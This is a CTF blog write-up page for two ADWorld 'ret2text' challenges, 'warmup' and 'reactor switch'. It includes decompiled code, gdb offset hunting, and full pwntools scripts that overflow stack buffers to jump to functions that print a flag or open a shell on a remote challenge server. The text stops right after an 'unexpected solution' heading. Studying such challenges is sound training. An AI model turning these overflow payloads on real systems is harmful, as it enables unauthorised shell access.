@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Computer, Network, Security">
+    <meta name="description" content="a blog on Hexo">
+    <meta name="author" content="TyeYeah">
+    
+    <title>
+        
+            ADWorld PWN Challenge Area Write-ups (ret2text) |
+        
+        Relish the Moment
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/img/wang.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Relish the Moment
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">ADWorld PWN Challenge Area Write-ups (ret2text)</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2020-07-29 20:12:33
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/stack-overflow/">stack-overflow</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.7k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>23 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>There are some easy <code>ret2text</code> challenges in challenge area.</p>
+<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>Attachment: <a href="/filehost/apcaw/warmup">warmup</a><br>Description: None</p>
+<p>Dont know what is this for, as it’s  fairly easy.</p>
+<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file warmup</span><br><span class="line">warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped</span><br><span class="line">$ checksec warmup</span><br><span class="line">[*] &#x27;/mnt/c/Users/David/Desktop/warmup&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>Pseudocode:<br><code>main</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;s, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">gets</span>(&amp;v5, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>sub_40060D</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40060D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>The target is returning to <code>sub_40060D()</code>, here introduce a method using <code>cyclic</code> (installed along with <code>pwntools</code>).<br>First create a 200-byte-length string:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure>
+<p>Then input it in <code>gdb</code> and debug:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./warmup -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef` to start, `gef config` to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from ./warmup...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./warmup)</span><br><span class="line">gef➤  b gets</span><br><span class="line">Breakpoint 1 at 0x400500</span><br><span class="line">...</span><br><span class="line">gef➤                         <span class="comment"># input</span></span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">...</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00000000004006a4 <span class="keyword">in</span> ?? ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">────────────────────────── registers ────</span><br><span class="line"><span class="variable">$rax</span>   : 0x00007fffffffe1e0  →  <span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&quot;</span></span><br><span class="line"><span class="variable">$rbx</span>   : 0x0</span><br><span class="line"><span class="variable">$rcx</span>   : 0x00007ffff7fbc980  →  0x00000000fbad2288</span><br><span class="line"><span class="variable">$rdx</span>   : 0x0</span><br><span class="line"><span class="variable">$rsp</span>   : 0x00007fffffffe228  →  <span class="string">&quot;saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]&quot;</span></span><br><span class="line"><span class="variable">$rbp</span>   : 0x6161617261616171 (<span class="string">&quot;qaaaraaa&quot;</span>?)</span><br><span class="line"><span class="variable">$rsi</span>   : 0x00000000006022a1  →  <span class="string">&quot;aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa[...]&quot;</span></span><br><span class="line"><span class="variable">$rdi</span>   : 0x00007ffff7fbf4d0  →  0x0000000000000000</span><br><span class="line"><span class="variable">$rip</span>   : 0x00000000004006a4  →   ret</span><br><span class="line"><span class="variable">$r8</span>    : 0x00007fffffffe1e0  →  <span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&quot;</span></span><br><span class="line"><span class="variable">$r9</span>    : 0x0</span><br><span class="line"><span class="variable">$r10</span>   : 0x410</span><br><span class="line"><span class="variable">$r11</span>   : 0x246</span><br><span class="line"><span class="variable">$r12</span>   : 0x0000000000400520  →   xor ebp, ebp</span><br><span class="line"><span class="variable">$r13</span>   : 0x00007fffffffe300  →  0x0000000000000001</span><br><span class="line"><span class="variable">$r14</span>   : 0x0</span><br><span class="line"><span class="variable">$r15</span>   : 0x0</span><br><span class="line"><span class="variable">$eflags</span>: [zero carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x0033 <span class="variable">$ss</span>: 0x002b <span class="variable">$ds</span>: 0x0000 <span class="variable">$es</span>: 0x0000 <span class="variable">$fs</span>: 0x0000 <span class="variable">$gs</span>: 0x0000</span><br><span class="line">────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffe228│+0x0000: <span class="string">&quot;saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]&quot;</span>    ← <span class="variable">$rsp</span></span><br><span class="line">0x00007fffffffe230│+0x0008: <span class="string">&quot;uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]&quot;</span></span><br><span class="line">0x00007fffffffe238│+0x0010: <span class="string">&quot;waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabja[...]&quot;</span></span><br><span class="line">0x00007fffffffe240│+0x0018: <span class="string">&quot;yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabla[...]&quot;</span></span><br><span class="line">0x00007fffffffe248│+0x0020: <span class="string">&quot;baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]&quot;</span></span><br><span class="line">0x00007fffffffe250│+0x0028: <span class="string">&quot;daabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpa[...]&quot;</span></span><br><span class="line">0x00007fffffffe258│+0x0030: <span class="string">&quot;faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]&quot;</span></span><br><span class="line">0x00007fffffffe260│+0x0038: <span class="string">&quot;haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]&quot;</span></span><br><span class="line">──────────────────────── code:x86:64 ────</span><br><span class="line">     0x400699                  mov    eax, 0x0</span><br><span class="line">     0x40069e                  call   0x400500 &lt;gets@plt&gt;</span><br><span class="line">     0x4006a3                  leave</span><br><span class="line"> →   0x4006a4                  ret</span><br><span class="line">[!] Cannot disassemble from <span class="variable">$PC</span></span><br><span class="line">──────────────────────────── threads ────</span><br><span class="line">[<span class="comment">#0] Id 1, Name: &quot;warmup&quot;, stopped 0x4006a4 in ?? (), reason: SIGSEGV</span></span><br><span class="line">────────────────────────────── trace ────</span><br><span class="line">[<span class="comment">#0] 0x4006a4 → ret</span></span><br><span class="line">─────────────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
+<p>Remember to break at the last <code>ret</code> (belongs to <code>main()</code>), so the <code>rsp</code> now stores the future <code>rip</code>. <code>rsp</code> starts with <code>saaa</code>, then use <code>cyclic</code> to calculate the offset (<code>rbp</code> that starts with <code>qaaa</code> can also be used, but remember to add 8 bytes):</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic -l saaa  <span class="comment"># rsp</span></span><br><span class="line">72</span><br><span class="line">$ cyclic -l qaaa  <span class="comment"># rbp</span></span><br><span class="line">64</span><br></pre></td></tr></table></figure>
+<p>So the offset should be <code>64 + 8 = 72</code>.</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;warmup&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">57407</span>)</span><br><span class="line">shell_addr = <span class="number">0x40060d</span></span><br><span class="line"><span class="built_in">print</span> sh.recv() </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + p64(shell_addr) </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">64</span> + p64(<span class="number">0</span>) + p64(shell_addr)</span><br><span class="line"><span class="comment">#payload = xxxxx + ebp + retaddr</span></span><br><span class="line">sh.sendline(payload) </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="reactor-switch"><a href="#reactor-switch" class="headerlink" title="reactor switch"></a>reactor switch</h2><p>Attachment: <a href="/filehost/apcaw/reactor_switch">reactor_switch</a><br>Description: Lil M discovered the interface of a nitrification reactor in a TNT production line in a private mine. She suspects that this factory might be engaged in the production of underground munitions, so Lil M intends to interfere with the operation of this TNT production line by closing the reactor, but the reactor has multiple gates, so she has to find a way to help her close all the gates.</p>
+<h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file reactor_switch</span><br><span class="line">reactor_switch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=6145840505e7d75d0020a02b556136ce4c936ed9, not stripped</span><br><span class="line">$ checksec reactor_switch</span><br><span class="line">[*] <span class="string">&#x27;/root/reactor_switch&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>Pseudocode:<br><code>main</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-240h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+40h] [rbp-200h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Please closing the reaction kettle\n&quot;</span>, <span class="number">0x23</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;The switch is:&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%p\n&quot;</span>, easy);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;s, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="built_in">gets</span>(&amp;v5, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>easy</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">easy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1C0h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+40h] [rbp-180h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;You have closed the first switch\n&quot;</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Please closing the second reaction kettle\n&quot;</span>, <span class="number">0x2A</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;The switch is:&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%p\n&quot;</span>, normal);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;s, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">gets</span>(&amp;v2, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>normal</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">normal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-140h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+40h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;You have closed the first switch\n&quot;</span>, <span class="number">0x22</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Please closing the third reaction kettle\n&quot;</span>, <span class="number">0x2A</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;The switch is:&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%p\n&quot;</span>, shell);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;s, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">gets</span>(&amp;v2, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>shell</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Addresses:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">easy	00000000004006B0	</span><br><span class="line">main	0000000000400759	</span><br><span class="line">normal	0000000000400607	</span><br><span class="line">shell	00000000004005F6	</span><br></pre></td></tr></table></figure>
+<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>Well, according to the description, I thought it would be a series of tasks. As for the codes, It seems to let us overflow 3 times to get shell.<br>For one thing, the program wasn’t written carefully since it always prints <code>You have closed the first switch</code> in <code>main()</code>, <code>easy()</code> and <code>normal()</code> (should be 1st, 2nd and 3rd, right?); for another thing, as we just want to get shell, we can overflow just once (unexpect solution: overflow to return to <code>shell()</code>).</p>
+<p>Offsets for three functions: <code>0x200</code> for <code>main()</code>; <code>0x180</code> for <code>easy()</code>; <code>0x100</code> for <code>normal()</code>.</p>
+<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>From <code>main()</code> return to <code>easy()</code> to <code>normal()</code> to <code>shell()</code>:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./reactor_switch&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">42608</span>)</span><br><span class="line"></span><br><span class="line">main_offset = <span class="number">0x200</span></span><br><span class="line">easy_offset = <span class="number">0x180</span></span><br><span class="line">normal_offset = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">easy_func_addr = <span class="number">0x04006b0</span></span><br><span class="line">normal_func_addr = <span class="number">0x0400607</span></span><br><span class="line">shell_func_addr = <span class="number">0x04005F6</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * main_offset + p64(<span class="number">0</span>) + p64(easy_func_addr)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * easy_offset + p64(<span class="number">0</span>) + p64(normal_func_addr)</span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span> * normal_offset + p64(<span class="number">0</span>) + p64(shell_func_addr)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>Unexpect solution: From <code>main()</code> return to <code>shell()</code>:</p>
